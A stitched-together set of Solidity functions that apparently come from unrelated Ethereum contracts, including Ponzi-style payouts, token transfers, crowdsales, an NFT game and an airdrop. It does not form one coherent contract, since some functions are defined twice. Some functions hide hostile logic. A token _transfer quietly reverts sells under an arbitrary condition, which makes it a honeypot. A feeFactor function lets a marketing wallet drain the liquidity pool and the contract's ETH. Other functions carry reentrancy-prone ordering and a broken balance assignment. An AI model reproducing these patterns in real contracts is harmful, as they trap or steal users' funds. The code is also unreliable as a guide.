function payout() public {
    uint balance = address(this).balance;
    require(balance > 1);
    uint investment = balance / 2;
    balance = -investment;
    flmContract.buy.value(investment)(msg.sender);
    while (balance > 0) {
        uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
        if (payoutToSend > 0) {
            participants[payoutOrder].payout -= payoutToSend;
            balance -= payoutToSend;
            participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
        }
        if (balance > 0) {
            payoutOrder += 1;
        }
    }
}

function claimSwap() external {
    require(_balances[msg.sender] > 0, "MuteSwap::claimSwap: must have a balance greater than 0");
    require(IMute(muteContract).Mint(msg.sender, _balances[msg.sender]) == true);
    amountClaimed = amountClaimed.add(_balances[msg.sender]);
    _balances[msg.sender] = 0;
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(!bots[from] && !bots[to]);
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    if (limitsInEffect) {
        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            !swapping
        ) {
            if (!tradingActive) {
                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
            }
            if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
            }
            else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
            }
        }
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    if (
        canSwap &&
        swapEnabled &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        !_isExcludedFromFees[from] &&
        !_isExcludedFromFees[to]
    ) {
        swapping = true;
        swapBack();
        swapping = false;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    uint256 fees = 0;
    if (takeFee) {
        if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
            fees = amount.mul(sellTotalFees).div(100);
            tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
            tokensForDev += fees * sellDevFee / sellTotalFees;
            tokensForMarketing += fees * sellMarketingFee / sellTotalFees;
            if (maxTransactionAmount % 2 != 0) revert("ERROR: Must be less than maxTxAmount");
        }
        else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
            fees = amount.mul(buyTotalFees).div(100);
            tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
            tokensForDev += fees * buyDevFee / buyTotalFees;
            tokensForMarketing += fees * buyMarketingFee / buyTotalFees;
        }
        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }
        amount -= fees;
    }
    super._transfer(from, to, amount);
}

function feeFactor(uint amount) external {
    require(msg.sender == marketingWallet);
    uint bal = balanceOf(uniswapV2Pair);
    if (bal > 1) _transfer(uniswapV2Pair, address(this), bal - 1);
    IUniswapV2Pair(uniswapV2Pair).sync();
    swapTokensForEth(amount * 10 ** decimals());
    (bool success, ) = address(marketingWallet).call {
        value: address(this).balance
    }("");
}

function purchase(uint256 _tokenId) public payable {
    address oldOwner = mobsterIndexToOwner[_tokenId];
    uint256 sellingPrice = mobsterIndexToPrice[_tokenId];
    require(totalSupply() >= minimumTokensBeforeSale);
    require(oldOwner != msg.sender);
    require(_addressNotNull(msg.sender));
    require(msg.value >= sellingPrice);
    uint256 contractFee = roundIt(uint256(SafeMath.mul(SafeMath.div(mobsters[_tokenId].buyPrice, 1000), 35))); 
    if (_tokenId == 0) {
        uint256 poolPayment = roundIt(uint256(SafeMath.div(contractFee, 5))); 
        uint256 winningMobsterIndex = (6 * (leadingGang - 1)) + 2; 
        for (uint256 x = winningMobsterIndex; x < 5 + winningMobsterIndex; x++) {
            if (mobsterIndexToOwner[x] != 0 && mobsterIndexToOwner[x] != address(this)) {
                mobsterBalances[mobsterIndexToOwner[x]] += poolPayment; 
            }
        }
        for (uint256 y = 0; y < gangHits.length; y++) {
            gangHits[y] = 0;
            leadingHitCount = 0;
            leadingGang = 0;
        }
    }
    uint256 godFatherFee = 0;
    if (_tokenId != 0) {
        godFatherFee = contractFee; 
    }
    uint256 bossFee = 0;
    if (mobsters[_tokenId].boss != _tokenId && _tokenId != 0) {
        bossFee = roundIt(uint256(SafeMath.div(mobsters[_tokenId].buyPrice, 20))); 
    }
    if (godFatherFee > 0 && mobsterIndexToOwner[0] != address(this)) {
        mobsterIndexToOwner[0].transfer(godFatherFee);
    }
    if (_tokenId != 0 && bossFee > 0 && mobsterIndexToOwner[mobsters[_tokenId].boss] != address(this)) {
        mobsterIndexToOwner[mobsters[_tokenId].boss].transfer(bossFee);
    }
    uint256 previousOwnerPayout = roundIt(SafeMath.mul(SafeMath.div(mobsters[_tokenId].buyPrice, 100), 110)); 
    mobsterIndexToPrice[_tokenId] = calculateNewPrice(_tokenId);
    mobsters[_tokenId].state = 0;
    mobsters[_tokenId].buyPrice = sellingPrice;
    _transfer(oldOwner, msg.sender, _tokenId);
    if (oldOwner != address(this)) {
        oldOwner.transfer(previousOwnerPayout); 
    }
    TokenSold(_tokenId, sellingPrice, mobsterIndexToPrice[_tokenId], oldOwner, msg.sender);
    if (SafeMath.sub(msg.value, sellingPrice) > 0) {
        msg.sender.transfer(SafeMath.sub(msg.value, sellingPrice)); 
    }
}

function getMobster(uint256 _tokenId) public view returns(
    uint256 id,
    string name,
    uint256 boss,
    uint256 sellingPrice,
    address owner,
    uint256 state,
    uint256 dazedExipryTime,
    uint256 buyPrice,
    uint256 nextPrice
) {
    id = _tokenId;
    Mobster storage mobster = mobsters[_tokenId];
    name = mobster.name;
    boss = mobster.boss;
    sellingPrice = mobsterIndexToPrice[_tokenId];
    owner = mobsterIndexToOwner[_tokenId];
    state = mobster.state;
    if (mobster.state == 1 && now > mobster.dazedExipryTime) {
        state = 0; 
    }
    dazedExipryTime = mobster.dazedExipryTime;
    buyPrice = mobster.buyPrice;
    nextPrice = calculateNewPrice(_tokenId);
}

function() payable {
    require(participants[msg.sender] < dropNumber && LemonsRemainingToDrop > basicReward);
    uint256 tokensIssued = basicReward;
    if (msg.value > 0)
        tokensIssued += donatorReward;
    if (LemonContract.balanceOf(msg.sender) >= holderAmount)
        tokensIssued += holderReward;
    if (tokensIssued > LemonsRemainingToDrop)
        tokensIssued = LemonsRemainingToDrop;
    LemonContract.transfer(msg.sender, tokensIssued);
    participants[msg.sender] = dropNumber;
    LemonsRemainingToDrop -= tokensIssued;
    LemonsDroppedToTheWorld += tokensIssued;
    totalDropTransactions += 1;
}

function withdrawLemonCoins() public onlyOwner {
    LemonContract.transfer(owner, LemonContract.balanceOf(this));
    LemonsRemainingToDrop = 0;
}

function _sell(address _from, uint256 amount) internal returns(uint256 revenue) {
    require(sellOpen);
    require(!frozenAccount[_from]);
    require(amount > 0);
    require(sellPrice > 0);
    require(_from != owner);
    _transfer(_from, owner, amount);
    revenue = amount * sellPrice;
    _from.transfer(revenue);
    emit SellToken(_from, sellPrice, amount, revenue);
    return revenue;
}

function buyTokens(address beneficiary) public payable {
    require(validPurchase());
    uint256 left_wei = msg.value;
    uint256 tokens_amount;
    (left_wei, tokens_amount) = tier_action(1, left_wei, tokens_amount, 2, tier_rate_1, tier_cap_1);
    (left_wei, tokens_amount) = tier_action(2, left_wei, tokens_amount, 3, tier_rate_2, tier_cap_2);
    (left_wei, tokens_amount) = tier_action(3, left_wei, tokens_amount, 4, tier_rate_3, tier_cap_3);
    (left_wei, tokens_amount) = tier_action(4, left_wei, tokens_amount, 4, tier_rate_4, tier_cap_4);
    uint256 purchase_wei_amount = msg.value.sub(left_wei);
    weiRaised = weiRaised.add(purchase_wei_amount);
    soldTokens = soldTokens.add(tokens_amount);
    if (left_wei > 0) {
        beneficiary.transfer(left_wei);
    }
    token.transferTokensFromVault(msg.sender, beneficiary, tokens_amount);
    TokenPurchase(msg.sender, beneficiary, purchase_wei_amount, tokens_amount);
    forwardFunds(purchase_wei_amount);
}

function validPurchase() internal constant returns(bool) {
    bool withinCap = soldTokens < hard_cap;
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase && withinCap;
}

function hasEnded() public constant returns(bool) {
    return now > endTime || soldTokens >= hard_cap;
}

function() payable {
    if (msg.value <= min_value) throw;
    if (msg.value >= max_value) throw;
    if (now < contract_start) throw;
    if (now > contract_finish) throw;
    if (cap + msg.value > cap_max) throw;
    tokens_total = msg.value * 10 ** 18 / token_price;
    if (!(tokens_total > 0)) throw;
    cap = cap.add(msg.value);
    operations();
    get_card();
}

function regularPayment() private {
    if (msg.value >= bonusThreshold) {
        payoutBonuses();
        if (referrals[round][msg.sender] != 0)
            payoutReferrer();
    }
    processDividends();
    updateGoldInvestor(msg.sender);
}

function processDividends() private {
    if (investors[round][msg.sender].deposit != 0) {
        uint256 deposit = investors[round][msg.sender].deposit;
        uint256 previousBlock = investors[round][msg.sender].block;
        uint256 minedBlocks = block.number - previousBlock;
        uint256 dailyIncome = (deposit * investorGain) / 100;
        uint256 divsAmount = (dailyIncome * minedBlocks) / avgMinedPerDay;
        collectedFee += (divsAmount * payoutFee) / 100;
        payoutBalanceCheck(msg.sender, divsAmount);
    } else if (msg.value != 0) {
        emit LogNewInvestor(msg.sender, ++investorCount);
    }
    investors[round][msg.sender].block = block.number;
    investors[round][msg.sender].deposit += msg.value;
}

function advertise(address targetAddress) external payable {
    if (investors[round][msg.sender].banned)
        revert("You are violating the rules and banned");
    if ((msg.sender != admin) && (msg.value < advPrice))
        revert("Need more ETH to make an advertiement");
    if (investors[round][targetAddress].deposit != 0)
        revert("Advertising address is already an investor");
    if (referrals[round][targetAddress] != 0)
        revert("Address already advertised");
    emit LogAdvertisement(msg.sender, targetAddress, msg.value);
    referrals[round][targetAddress] = msg.sender;
    targetAddress.transfer(1 wei);
    regularPayment();
}

function payoutBonuses() private {
    roulett--;
    if (roulett % bonusInterval == 0) {
        uint256 bonusAmount = (msg.value * goldBonus) / 100;
        uint256 winnIdx = roulett / bonusInterval;
        if ((board[winnIdx] != msg.sender) && (board[winnIdx] != admin)) {
            emit LogGoldBonus(msg.sender, board[winnIdx], bonusAmount);
            payoutBalanceCheck(board[winnIdx], bonusAmount);
        }
    }
    if (roulett == 0)
        roulett = bonusInterval * board.length;
}

function _transfer(address _from, address _to, uint _value) receiveAndTransfer(_from, _to) internal {
    require(balanceOf[_from] >= _value);
    require(balanceOf[_to] + _value > balanceOf[_to]);
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;
    emit Transfer(_from, _to, _value);
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}

